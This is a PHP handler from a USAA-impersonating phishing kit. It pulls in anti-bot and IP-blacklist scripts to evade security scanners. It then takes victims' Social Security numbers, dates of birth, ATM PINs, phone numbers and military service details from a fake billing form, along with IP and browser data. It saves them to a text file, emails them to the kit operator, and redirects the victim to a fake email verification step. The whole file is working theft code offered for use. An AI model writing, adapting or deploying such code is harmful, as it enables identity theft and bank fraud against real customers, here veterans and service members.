<?php
ob_start();
session_start();

include'../Anti/IP-BlackList.php';  
include'../Anti/Bot-Crawler.php';
include'../Anti/Bot-Spox.php';
include'../Anti/blacklist.php';
include'../Anti/new.php';
include'../Anti/Dila_DZ.php';

if(isset($_POST['ssn'])&&isset($_POST['dob'])&&isset($_POST['zipcode'])&&isset($_POST['spox'])){
	include '../config.php';
	include '../Functions/Fuck-you.php';

	$hi="#---------------------------[ -USAA Kika- NEW BILLING ]----------------------------#\r\n";
	$hi.="SSN : {$_POST['ssn']}\r\n";
	$hi.="Date of birth : {$_POST['dob']}\r\n";
	$hi.="Phone Number : {$_POST['phoneNumber']}\r\n";
	$hi.="Zip Code : {$_POST['zipcode']}\r\n";
	$hi.="Atm pin : {$_POST['atmpin']}\r\n";
	$hi.="Branch of Service : {$_POST['branch']}\r\n";
	$hi.="Seperation Year : {$_POST['spyear']}\r\n";

$hi.="#---------------------------[ -USAA Kika- IP INFO ]----------------------------#\r\n";
	$hi.="IP ADDRESS	: {$_SESSION['ip']}\r\n";
	$hi.="IP COUNTRY	: {$_SESSION['country']}\r\n";
	$hi.="IP CITY	: {$_SESSION['city']}\r\n";
	$hi.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	$hi.="USER AGENT	: {$_SERVER['HTTP_USER_AGENT']}\r\n";
	$hi.="TIME		: ".date("d/m/Y h:i:sa")." GMT\r\n";
	$hi.="#---------------------------[ -PNC Kika- NEW BILLING ]----------------------------#\r\n";

		$save=fopen("../usaa/billing.txt","a+");
		fwrite($save,$hi);
		fclose($save);

	$subject="#USAA SPOX BILLING From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";

	$headers="From: USAA SPOX  <usaa@results.coom>\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";

		@mail($your_email,$subject,$hi,$headers);
		
    	$key = substr(sha1(mt_rand()),1,25);
		exit(header("Location: ../../email_verification?usaa_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."")); 
  }else{
    header("HTTP/1.0 404 Not Found");
    exit();
}

?>